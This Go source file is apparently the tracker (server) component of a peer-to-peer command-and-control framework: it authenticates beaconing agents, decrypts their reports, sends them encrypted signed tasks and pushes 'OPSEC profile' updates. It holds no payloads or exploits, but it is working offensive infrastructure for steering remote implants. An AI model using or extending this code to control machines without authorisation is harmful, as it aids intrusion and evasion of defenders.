package tracker

import (
	"fmt"
	"p2p-c2-framework/core"
	"p2p-c2-framework/network"
	"p2p-c2-framework/util"
	"sync"
	"time"
)

// Tracker represents a C2 tracker/server
type Tracker struct {
	peerID           string
	keyPair          *core.RSAKeyPair
	keyStore         *core.KeyStore
	sessionTable     *core.SessionTable
	handshakeManager *core.HandshakeManager
	networkManager   *network.NetworkManager
	logger           *util.Logger
	config           *TrackerConfig
	isRunning        bool
	mutex            sync.RWMutex
	agents           map[string]*AgentInfo
	agentsMutex      sync.RWMutex
	taskQueue        []*core.Task
	taskMutex        sync.RWMutex
}

// TrackerConfig represents tracker configuration
type TrackerConfig struct {
	ListenAddress  string
	ListenPort     int
	KeyDirectory   string
	MaxConnections int
	AuthRequired   bool
	AuthPassword   string
	TLSEnabled     bool
	TLSCertFile    string
	TLSKeyFile     string
}

// AgentInfo represents information about a connected agent
type AgentInfo struct {
	PeerID       string                 `json:"peer_id"`
	IPAddress    string                 `json:"ip_address"`
	LastBeacon   time.Time              `json:"last_beacon"`
	Status       string                 `json:"status"`
	Capabilities []string               `json:"capabilities"`
	Metadata     map[string]interface{} `json:"metadata"`
	TaskCount    int                    `json:"task_count"`
}

// NewTracker creates a new tracker
func NewTracker(config *TrackerConfig) (*Tracker, error) {
	// Create key store
	keyStore, err := core.NewKeyStore(config.KeyDirectory)
	if err != nil {
		return nil, fmt.Errorf("failed to create key store: %w", err)
	}

	// Get local key pair
	keyPair := keyStore.GetLocalKeyPair()

	// Generate peer ID
	peerID, err := core.GeneratePeerID(keyPair.PublicKey)
	if err != nil {
		return nil, err
	}

	// Create session table
	sessionTable := core.NewSessionTable()

	// Create handshake manager
	handshakeManager := core.NewHandshakeManager(peerID, keyPair, sessionTable)

	// Create network manager
	networkManager := network.NewNetworkManager(peerID, sessionTable, keyPair)

	tracker := &Tracker{
		peerID:           peerID,
		keyPair:          keyPair,
		keyStore:         keyStore,
		sessionTable:     sessionTable,
		handshakeManager: handshakeManager,
		networkManager:   networkManager,
		logger:           util.GetLogger("tracker"),
		config:           config,
		agents:           make(map[string]*AgentInfo),
		taskQueue:        make([]*core.Task, 0),
	}

	// Set up network message handler
	networkManager.SetMessageHandler(tracker.handleMessage)

	return tracker, nil
}

// Start starts the tracker
func (t *Tracker) Start() error {
	t.mutex.Lock()
	defer t.mutex.Unlock()

	if t.isRunning {
		return nil
	}

	t.logger.Info("Starting tracker %s", t.peerID[:16]+"...")

	// Start network listener
	if t.config.TLSEnabled {
		err := t.networkManager.StartTLSListener(
			t.config.ListenAddress,
			t.config.ListenPort,
			t.config.TLSCertFile,
			t.config.TLSKeyFile,
		)
		if err != nil {
			return err
		}
	} else {
		err := t.networkManager.StartTCPListener(t.config.ListenAddress, t.config.ListenPort)
		if err != nil {
			return err
		}
	}

	t.isRunning = true
	t.logger.Info("Tracker started successfully on %s:%d", t.config.ListenAddress, t.config.ListenPort)

	return nil
}

// Stop stops the tracker
func (t *Tracker) Stop() {
	t.mutex.Lock()
	defer t.mutex.Unlock()

	if !t.isRunning {
		return
	}

	t.logger.Info("Stopping tracker")

	// Shutdown network manager
	t.networkManager.Shutdown()

	t.isRunning = false
	t.logger.Info("Tracker stopped")
}

// handleMessage handles incoming messages
func (t *Tracker) handleMessage(packet *core.Packet, conn *network.Connection) {
	t.logger.Debug("Received packet type %s from %s", packet.Type, packet.PeerID)

	switch packet.Type {
	case core.PacketTypeHandshakeInit:
		t.handleHandshakeInit(packet, conn)
	case core.PacketTypeHandshakeResponse:
		t.handleHandshakeResponse(packet, conn)
	case core.PacketTypeBeacon:
		t.handleBeacon(packet, conn)
	case core.PacketTypeTaskResponse:
		t.handleTaskResponse(packet, conn)
	default:
		t.logger.Warn("Unhandled packet type: %s", packet.Type)
	}
}

// handleHandshakeInit handles handshake init packets
func (t *Tracker) handleHandshakeInit(packet *core.Packet, conn *network.Connection) {
	// Get agent's public key from keystore
	agentPublicKey, exists := t.keyStore.GetPeerPublicKey(packet.PeerID)
	if !exists {
		t.logger.Error("Unknown agent attempting handshake: %s", packet.PeerID)
		return
	}

	responsePacket, err := t.handshakeManager.HandleHandshakeInit(packet, agentPublicKey)
	if err != nil {
		t.logger.Error("Failed to handle handshake init: %v", err)
		return
	}

	// Send response
	err = t.networkManager.SendPacket(responsePacket, packet.PeerID)
	if err != nil {
		t.logger.Error("Failed to send handshake response: %v", err)
	}
}

// handleHandshakeResponse handles handshake response packets
func (t *Tracker) handleHandshakeResponse(packet *core.Packet, conn *network.Connection) {
	// Get agent's public key from keystore
	agentPublicKey, exists := t.keyStore.GetPeerPublicKey(packet.PeerID)
	if !exists {
		t.logger.Error("Unknown agent in handshake response: %s", packet.PeerID)
		return
	}

	err := t.handshakeManager.HandleHandshakeResponse(packet, agentPublicKey)
	if err != nil {
		t.logger.Error("Failed to handle handshake response: %v", err)
		return
	}

	t.logger.Info("Handshake completed with agent %s", packet.PeerID)
}

// handleBeacon handles beacon packets from agents
func (t *Tracker) handleBeacon(packet *core.Packet, conn *network.Connection) {
	// Get session key for decryption
	sessionKey, err := t.handshakeManager.GetSessionKey(packet.PeerID)
	if err != nil {
		t.logger.Error("No session key for agent %s: %v", packet.PeerID, err)
		return
	}

	// Parse beacon payload
	var payload core.BeaconPayload
	err = packet.GetPayload(sessionKey, &payload)
	if err != nil {
		t.logger.Error("Failed to parse beacon: %v", err)
		return
	}

	// Update agent info
	t.updateAgentInfo(packet.PeerID, conn.GetAddress(), &payload)

	// Process task results if any
	for _, result := range payload.TaskResults {
		t.logger.Info("Received task result for task %s: %s", result.TaskID, result.Status)
	}

	t.logger.Debug("Processed beacon from agent %s", packet.PeerID)
}

// handleTaskResponse handles task response packets
func (t *Tracker) handleTaskResponse(packet *core.Packet, conn *network.Connection) {
	// Get session key for decryption
	sessionKey, err := t.handshakeManager.GetSessionKey(packet.PeerID)
	if err != nil {
		t.logger.Error("No session key for agent %s: %v", packet.PeerID, err)
		return
	}

	// Parse task response payload
	var payload core.TaskResponsePayload
	err = packet.GetPayload(sessionKey, &payload)
	if err != nil {
		t.logger.Error("Failed to parse task response: %v", err)
		return
	}

	t.logger.Info("Received task response for task %s: %s", payload.TaskResult.TaskID, payload.TaskResult.Status)
}

// updateAgentInfo updates information about an agent
func (t *Tracker) updateAgentInfo(peerID, ipAddress string, beacon *core.BeaconPayload) {
	t.agentsMutex.Lock()
	defer t.agentsMutex.Unlock()

	agent, exists := t.agents[peerID]
	if !exists {
		agent = &AgentInfo{
			PeerID:    peerID,
			IPAddress: ipAddress,
			Metadata:  make(map[string]interface{}),
		}
		t.agents[peerID] = agent
		t.logger.Info("New agent registered: %s from %s", peerID[:16]+"...", ipAddress)
	}

	agent.LastBeacon = time.Now()
	agent.Status = beacon.Status
	agent.Capabilities = beacon.Capabilities
	
	// Update metadata
	for key, value := range beacon.Metadata {
		agent.Metadata[key] = value
	}
}

// SendTaskToAgent sends a task to a specific agent
func (t *Tracker) SendTaskToAgent(agentPeerID string, task *core.Task) error {
	// Get session key for encryption
	sessionKey, err := t.handshakeManager.GetSessionKey(agentPeerID)
	if err != nil {
		return err
	}

	// Create task request payload
	payload := &core.TaskRequestPayload{Task: task}

	// Create packet
	packet := core.NewPacket(core.PacketTypeTaskRequest, t.peerID, agentPeerID)

	// Set payload with encryption
	err = packet.SetPayload(payload, sessionKey)
	if err != nil {
		return err
	}

	// Sign packet
	err = packet.Sign(t.keyPair)
	if err != nil {
		return err
	}

	// Send packet
	err = t.networkManager.SendPacket(packet, agentPeerID)
	if err != nil {
		return err
	}

	// Update agent task count
	t.agentsMutex.Lock()
	if agent, exists := t.agents[agentPeerID]; exists {
		agent.TaskCount++
	}
	t.agentsMutex.Unlock()

	t.logger.Info("Sent task %s to agent %s", task.ID, agentPeerID[:16]+"...")
	return nil
}

// SendOpsecProfile sends an OPSEC profile update to an agent
func (t *Tracker) SendOpsecProfile(agentPeerID string, profile *core.OpsecProfilePayload) error {
	// Get session key for encryption
	sessionKey, err := t.handshakeManager.GetSessionKey(agentPeerID)
	if err != nil {
		return err
	}

	// Create packet
	packet := core.NewPacket(core.PacketTypeOpsecProfile, t.peerID, agentPeerID)

	// Set payload with encryption
	err = packet.SetPayload(profile, sessionKey)
	if err != nil {
		return err
	}

	// Sign packet
	err = packet.Sign(t.keyPair)
	if err != nil {
		return err
	}

	// Send packet
	err = t.networkManager.SendPacket(packet, agentPeerID)
	if err != nil {
		return err
	}

	t.logger.Info("Sent OPSEC profile to agent %s", agentPeerID[:16]+"...")
	return nil
}

// GetAgents returns information about all connected agents
func (t *Tracker) GetAgents() map[string]*AgentInfo {
	t.agentsMutex.RLock()
	defer t.agentsMutex.RUnlock()

	agents := make(map[string]*AgentInfo)
	for peerID, agent := range t.agents {
		agents[peerID] = agent
	}

	return agents
}

// GetAgent returns information about a specific agent
func (t *Tracker) GetAgent(peerID string) (*AgentInfo, bool) {
	t.agentsMutex.RLock()
	defer t.agentsMutex.RUnlock()

	agent, exists := t.agents[peerID]
	return agent, exists
}

// GetPeerID returns the tracker's peer ID
func (t *Tracker) GetPeerID() string {
	return t.peerID
}

// GetStatus returns the tracker's status
func (t *Tracker) GetStatus() map[string]interface{} {
	t.mutex.RLock()
	defer t.mutex.RUnlock()

	return map[string]interface{}{
		"peer_id":     t.peerID,
		"is_running":  t.isRunning,
		"connections": t.networkManager.GetConnectionCount(),
		"agents":      len(t.agents),
		"tasks":       len(t.taskQueue),
	}
}

// IsRunning returns true if the tracker is running
func (t *Tracker) IsRunning() bool {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	return t.isRunning
}

// CleanupStaleAgents removes agents that haven't beaconed recently
func (t *Tracker) CleanupStaleAgents(timeout time.Duration) {
	t.agentsMutex.Lock()
	defer t.agentsMutex.Unlock()

	now := time.Now()
	for peerID, agent := range t.agents {
		if now.Sub(agent.LastBeacon) > timeout {
			t.logger.Info("Removing stale agent: %s", peerID[:16]+"...")
			delete(t.agents, peerID)
		}
	}
}

